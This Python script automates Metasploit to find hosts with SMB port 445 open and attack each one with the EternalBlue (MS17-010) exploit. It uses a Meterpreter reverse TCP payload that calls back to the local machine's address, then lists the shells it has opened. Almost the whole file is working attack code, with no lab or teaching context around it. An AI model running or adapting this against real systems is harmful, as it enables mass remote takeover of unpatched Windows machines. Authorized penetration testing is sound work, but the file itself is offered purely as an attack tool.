from metasploit_script import *
from json_data_processing_script import *

import pdb
import socket


# check opened port
opened_vuln_port, ip_vuln = look_for_port()
print(opened_vuln_port)
print(ip_vuln)
# launch metasploit
client, console = main_connection()


####################################GET IP HOSTNAME#########################################
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
hostname = s.getsockname()[0]
s.close()


#######################################CHECK OPENED PORT####################################
if '445' in opened_vuln_port:
    auxiliary_scan = 'scanner/smb/smb_ms17_010'
    exploit_name = 'windows/smb/ms17_010_eternalblue'

    #####################################GET EXPLOIT########################################

    exploit = main_run_exploit(exploit_name)

    ######################################GET IP VULN FOR 445###############################

    vuln_ip_445 = look_for_ip_associated_port(ip_vuln, '445')

    #######################################CONFIG OPTIONS AND PAYLOAD#######################

    #pdb.set_trace()
    running_config_exploit = main_change_option_exploit('CheckModule', auxiliary_scan, 'STR')

    payload = main_choose_payload('windows/x64/meterpreter/reverse_tcp')
    running_config_payload = main_config_payload('LHOST',hostname,'STR')

    for ip in vuln_ip_445:
        main_change_option_exploit('RHOSTS', ip, 'STR')
        json = main_exe_exploit()

    print(client.sessions.list)